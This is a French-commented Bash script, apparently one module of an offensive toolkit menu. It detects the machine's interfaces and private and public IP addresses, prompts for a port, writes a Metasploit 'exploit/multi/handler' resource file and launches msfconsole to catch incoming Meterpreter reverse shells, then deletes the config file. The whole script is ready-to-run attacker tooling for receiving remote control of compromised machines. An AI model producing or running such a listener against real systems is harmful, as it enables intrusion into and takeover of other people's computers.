## Couleurs BASH
DEFAULT="\e[00m"
BLACK="\e[30m"
RED="\e[31m"
GREEN="\e[32m"
ORANGE="\e[33m"
BLUE="\e[34m"
MAGENTA="\e[35m"
CYAN="\e[36m"
WHITE="\e[37m"

## Effets de texte (défaut, gras, souligné)
export DEF="\e[0;0m"
export BOLD="\e[1m"
export UNDER="\e[4m"


eth0=`ifconfig | grep -v -i "ether" | awk {'print $1'} | sed "s/.$//" | grep "eth" | tail -1` > /dev/null 2>&1
wlan0=`ifconfig | awk {'print $1'} | sed "s/.$//" | grep "wlan" | tail -1` > /dev/null 2>&1
IPeth0=`ifconfig $eth0 | grep -w "inet" | awk '{print $2}'` > /dev/null 2>&1
IPwlan0=`ifconfig $wlan0 | grep -w "inet" | awk '{print $2}'` > /dev/null 2>&1
if [ -z $wlan0 ];then
	if [ -z $IPeth0 ];then
		interface="lo"
	else
		interface=$eth0
	fi
else
	interface=$wlan0
fi
ipprivee=`ifconfig $interface | grep -w "inet" | awk '{print $2}'` > /dev/null 2>&1
ippublique=`wget http://checkip.dyndns.org -O - -o /dev/null | cut -d : -f 2 | cut -d \< -f 1` > /dev/null 2>&1
gateway=`ip route | grep "default" | awk {'print $3'}` > /dev/null 2>&1
session=`hostname`
iprange=`ip route | grep "kernel" | awk {'print $1'}` > /dev/null 2>&1
path=`pwd`

trap ctrl_c INT
ctrl_c() {
echo "" && echo ""
echo -e "$RED$BOLD [-]$DEFAULT$CYAN Suppression des fichiers de configuration.$DEFAULT
"
rm $path/../logs/meterpreter
echo -e -n "$MAGENTA [>]$CYAN Appuiez sur ENTRÉE pour afficher les options.$DEFAULT"
read -e -p "
" -n 1 -s
cd
cd $path/../
./suite.sh
}

echo -e -n "$MAGENTA [>]$CYAN Entrez le port sur lequel vous voulez écouter : $DEFAULT"
read port

echo -e "$ORANGE [?]$DEFAULT$CYAN Propriétés du listener : - lhost : $ipprivee"
echo -e "                              - lport : $port$DEFAULT
"

echo -e "$BLUE [...]$DEFAULT$CYAN Création du fichier de configuration du listener... $DEFAULT"

echo "use exploit/multi/handler
set lhost $ipprivee
set lport $port
exploit" > $path/../logs/meterpreter

sleep 0.5

echo -e "$BLUE [...]$DEFAULT$CYAN Ouverture du listener... $DEFAULT
"

cd
msfconsole -q -r $path/../logs/meterpreter



echo -e "$RED$BOLD [-]$DEFAULT$CYAN Suppression des fichiers de configuration.$DEFAULT
"
rm $path/../logs/meterpreter

echo ""
echo -e -n "$MAGENTA [>]$CYAN Appuiez sur ENTRÉE pour afficher les options.$DEFAULT"
read -e -p "
" -n 1 -s




cd
cd $path/../
./suite.sh
